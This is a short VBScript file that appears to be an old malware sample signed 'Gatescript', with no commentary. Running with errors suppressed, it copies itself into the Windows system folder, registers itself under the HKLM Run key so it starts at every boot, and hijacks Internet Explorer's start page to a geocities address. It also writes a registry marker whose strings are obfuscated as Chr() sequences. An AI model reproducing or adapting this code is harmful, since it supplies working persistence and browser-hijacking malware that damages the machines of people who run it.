'test2
ON ERROR RESUME NEXT
Dim GATESCRIPTcmsgcateau
Dim GATESCRIPTcborrcateau
Dim GATESCRIPTccolcateau
Dim zcateau
Dim GATESCRIPTnarcateau
Dim GATESCRIPTdicateau
Dim GATESCRIPTvalcateau
Dim GATESCRIPTsencateau
Dim GATESCRIPTteccateau
Dim vteccateau
Set GATESCRIPTwshcateau = CreateObject("WScript.Shell")
Set GATESCRIPTfsocateau= CreateObject("scripting.filesystemobject")
GATESCRIPTwshcateau.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
GATESCRIPTfsocateau.copyfile wscript.scriptfullname,GATESCRIPTfsocateau.GetSpecialFolder(0)& "\gatescript.vbs"
GATESCRIPTwshcateau.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GatescriptRun","wscript.exe " & GATESCRIPTfsocateau.GetSpecialFolder(0) & "\gatescript.vbs %"
GATESCRIPTwshcateau.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.geocities.com/gatescript"
'Gatescript - Geocities.com/gatescript
